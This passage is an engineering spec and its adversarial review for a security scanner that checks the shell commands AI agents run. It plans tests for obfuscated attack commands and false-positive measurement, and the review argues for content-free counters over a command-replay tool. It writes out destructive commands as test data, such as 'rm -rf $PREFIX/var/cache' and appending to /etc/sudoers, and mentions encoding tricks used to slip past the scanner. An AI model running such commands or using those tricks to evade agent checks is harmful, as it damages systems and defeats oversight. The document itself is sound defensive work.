- BEFORE/AFTER DELTA on the benign half, per class, failing by name on any GAIN. DEFEAT STEP: temporarily replace the BEFORE simulator with the AFTER scanner and confirm the delta collapses to zero everywhere — if the numbers do not move, the simulator is not modelling the pre-fix state and every delta it reports is meaningless. This is the exact failure mode I hit live: the shipped clearQuoteFlags simulator stops modelling anything once the gate is removed.
- ATTACK-PAIR SEVERITY EQUALITY across the full transform x rule matrix. DEFEAT STEP: revert internal/shellast/expand.go and confirm the attack half goes red while the `bare` half stays green, per pair — a matrix that stays green with the expander reverted is scoring controls only.
- REPLAY WIRE-SAFETY: feed the scorer synthetic tool-check records whose command strings embed a unique high-entropy marker, and assert the marker appears nowhere in stdout, stderr, or any file the tool writes. DEFEAT STEP: add a debug line that prints the command and confirm the test fails — without this guard a measurement tool built to make us safer becomes the largest secret-egress path in the agent.
- REPLAY GATE ARITHMETIC: assert the scorer computes POSIX-classified parse-failure rate over POSIX-classified commands only, not over all traffic. DEFEAT STEP: feed a corpus that is 90% PowerShell with zero POSIX failures and confirm the reported POSIX failure rate is 0% rather than being diluted toward 0% by the PowerShell volume — a denominator error here would wave through exactly the regression the gate exists to catch.

### Risks

THE CORPUS IS ONLY AS GOOD AS ITS BENIGN HALF. A benign set drawn from the repo's own history will over-represent POSIX and under-represent the Windows/PowerShell commands that dominate this product's actual field traffic — which is exactly where the fail-closed risk lives. The real-traffic replay is the corrective and it is not optional; the hand-built corpus alone MUST NOT be accepted as the rollout gate.

SINGLE-ENDPOINT SAMPLE BIAS: CND34521VN is the test tenant and its 816 decisions are heavily agent-driven and skewed by this very engagement's probing. State that limitation on the number rather than presenting it as a fleet measurement — the honesty discipline applies to our own metrics too. FINDINGS.md's PRE-A section already records that no second endpoint exists, so a broader sample is owner-gated and not something this spec can conjure.

SECRET-LEAK RISK IS REAL AND IS THE ONE THING THAT CAN GO BADLY WRONG HERE: real command strings contain credentials. A replay tool that writes command text to a file or a log would be a worse incident than the bypass it was built to measure. The no-input-substring test is mandatory, not a nice-to-have.

DO NOT let this spec delay F8a. F8a is measured at zero benign delta against every instrument the repo already owns and needs no new corpus to ship; the corpus gates F8b's fail-closed arm specifically. Sequencing the CRITICAL fix behind corpus construction would be the wrong trade.

POWERSHELL SCOPE CREEP is the main programme risk: the moment a PowerShell parser is discussed inside this cluster it will absorb it. Keep it a measured roadmap item with the exposure stated honestly via shell-not-analyzed.

### ADVERSARIAL REVIEW - verdict: NEEDS_REVISION

- THE CENTRAL DELIVERABLE HAS NO DATA SOURCE. cmd/ai-shell-corpus-score/main.go is specced to 'read the endpoint's own recorded tool-check inputs from the local decision/event store'. No such store exists. internal/daemon/evidence_delivery.go:133 documents the durable spool as carrying 'never raw prompt/output/command text'; the outbound AiToolCheckRequest carries commandshape.FromToolInput (ai_handlers.go:2611 — and internal/commandshape/shape.go's package doc says it 'never returns positional argument values or raw command text'), toolInputHash (:2616), and a redacted preview only when findings exist (:2588-2589); toolrisk.Finding is barred from storing the value by the package invariant at toolrisk.go:10-14; and grepping internal/daemon for command logging returns only daemon control-plane commands (server.go:1436, uninstall.go, update.go), never agent tool input. So the replay tool has nothing to replay, the '<0.5% POSIX parse failure on real traffic' gate cannot be computed, and the mandatory no-input-substring test is a wire-safety test on a binary with no input.
- THEREFORE F8b'S ROLLOUT GATE IS UNSATISFIABLE AS SPECCED. F8b's risks say the hand-built corpus 'MUST NOT be accepted as the rollout gate' and that the replay 'is not optional'. With the replay unbuildable, F8b as written can never ship — or ships on the corpus the spec explicitly forbids as sufficient. This has to be repaired before the wave is planned, or the CRITICAL/HIGH pair deadlocks.
- DEPENDENCY GRAPH IS INVERTED RELATIVE TO THE PROSE. dependsOn is [F8a, F8b], but the fix text says 'Build the instrument FIRST, run it, and let its numbers decide whether F8b ships as specified', and F8b's risks say the corpus gates F8b. An implementer reading dependsOn builds the gate after the thing it gates.
- SEVERITY-EQUALITY ASSERTION WILL FAIL BY CONSTRUCTION ON ONE OF ITS OWN CASES. TestExpansion_AttackPairsMatchBareControl asserts each attack twin produces the same class AND severity as its `bare` control across the whole transform x rule matrix. But F8a's own risks section says the ANSI-C case blocks for a different reason (the decoded field becomes a single argv[0] containing spaces), which will not produce the control's class for every rule in the matrix. Either carve the ANSI-C row out with a recorded expected verdict, or the matrix goes red on day one and gets weakened under pressure.
- CORPUS BENIGN HALF NEEDS THE SHAPE F8a ACTUALLY BREAKS. The listed benign axis omits `<unknown-expansion><literal-system-path>` — `rm -rf $DESTDIR/usr/lib`, `rm -rf $PREFIX/var/cache`, `>> $ROOT/etc/sudoers`. That is the family F8a's specced splitting rule newly blocks (see the F8a review). Whatever splitting design lands, these must be in the benign half or the corpus certifies the wrong thing.
- MINOR: adversarial_wsg_test.go's FP guard function begins at :81 (the spec cites :78-108), and quoted_target_fp_test.go's loader is :61-78 (cited :60-77). Immaterial, but the spec is otherwise line-exact and these two are not.

**Corrected root cause**: The corpus half of the root cause is CONFIRMED and every citation checks out: parity-vectors/command-quoting.json's own `description` scopes it to the QA-0802 quoted-target anchor fix and carries no expansion fixtures; loadQuotingCorpus's one-sided-corpus guard is at quoted_target_fp_test.go:61-78; preQuoteFixScan (the delta simulator the spec says to copy) is at :99-103 and is used at :143, :151, :204; TestWSG_ShellObfuscation_FalsePositiveGuard is at adversarial_wsg_test.go:81; both CI lanes exist. The PowerShell verdict is CONFIRMED and correctly scoped out: toolrisk.go:140 and :158 are flat regex, shellast.go:507-543 is a flag vocabulary and not a parser, :597-659 is the -EncodedCommand decode, shellast_scan.go:404-415 re-enters the decoded body into commandRules as flat regex, and go.mod vendors no PowerShell parser. Keeping it a measured roadmap item is right.\n\nWhat is WRONG is the premise of deliverable (3). There is no store of real command text on the endpoint to replay. The endpoint is content-free by construction: internal/daemon/evidence_delivery.go:133 states the durable spool carries 'never raw prompt/output/command text'; the tool-check request forwards only commandshape.FromToolInput (ai_handlers.go:2611, and internal/commandshape/shape.go's package doc: 'never returns positional argument values or raw command text'), toolInputHash (:2616), and a policy-gated redacted preview (:2589); toolrisk.Finding never stores the value (toolrisk.go:10-14); and no daemon log records agent command text (the only command logging in internal/daemon is pending-command/update/uninstall control-plane strings). The 816 allow + 6 block decisions FINDINGS.md records are decision rows, not a command corpus.


**Corrected approach**: Replace the offline replay with IN-PROCESS, CONTENT-FREE COUNTERS at the scan site. Increment a dialect histogram and a parse-failure-by-dialect counter inside toolrisk.Scan (toolrisk.go:281-295 bash branch, :312-317 default branch) using the same expvar-style pattern the package already ships — `interpreterBodyOversize` and `interpreterBodyUndecodable` (incremented at interpreter_body.go:186 and shellast_scan.go:419) are the existing precedent and were added for exactly this 'the rate is counted, not hoped' reason. Surface them through the existing content-free spool. This inherits wire-safety by construction instead of re-establishing it in a new binary, and it needs no store that does not exist.\n\nREQUIRED COMPANION CHANGE, or the measurement is silently dropped: new metadata keys must be added to the spool sanitizer allowlist in internal/daemon/evidence_delivery.go (the map around :125-140) — that map strips any key not listed at the spool boundary. A counter that never reaches the backend is the exact green-surface-on-a-dead-path failure this programme exists to stop. Backend must accept the keys first (deploy order).\n\nSEQUENCING, given feature flags are banned. 'Measure, then ship F8b' cannot mean shipping F8b dark. The honest order is: F8a ships; then the dialect router + counters + `shell-not-analyzed` INFO ship ON together (decision-neutral, so no availability risk, and the INFO class IS the field instrument for non-POSIX volume); `shell-unparsed` HIGH ships in a following change once the counters return a POSIX-classified parse-failure rate. Write that into the spec explicitly.\n\nAlso invert the declared dependencies to match the prose: corpus + delta instrument (items 1-2) dependOn F8a only, so they exist before F8b's router is written; the counters land WITH F8b.


**Missing changes the reviewer found**:

- **Installers** `internal/daemon/evidence_delivery.go` - Add any new content-free measurement keys (dialect histogram, parse-failure-by-dialect) to the spool sanitizer allowlist around :125-140. Keys not listed there are stripped at the spool boundary, so the measurement would be silently dropped — a green instrument on a dead path.
- **Backend** `src/ai-security-policy/ai-security-policy.constants.ts` - If the counters ride the AI event metadata, the Backend must accept the new content-free keys before the agent emits them (backend-first deploy order). The spec's deploy-order analysis covers the class tuple but not the measurement keys.
- **Installers** `internal/toolrisk/toolrisk.go` - Host the counters here, next to the existing expvar-style precedent (interpreterBodyOversize / interpreterBodyUndecodable, incremented at interpreter_body.go:186 and shellast_scan.go:419), rather than in a new cmd/ binary. Increment in Scan at both :281-295 and :312-317.

**Collateral risk**: None of the PROVEN-WORKING capabilities are touched — this is instrumentation. The one genuine hazard the spec identifies (a measurement tool becoming a secret-egress path) is correctly rated as the worst outcome here, and the corrected approach removes it structurally by never handling command text at all rather than by testing that it does not print it.

**Effort correction**: M (1-2d) is under-estimated → L. The transform axis (8) x rule axis (10) x two halves, plus a PowerShell/cmd benign block, plus a before/after simulator that must survive the F8a gate deletion, plus CI wiring, plus counters + the spool-allowlist change + backend key acceptance, is 3-5 days.
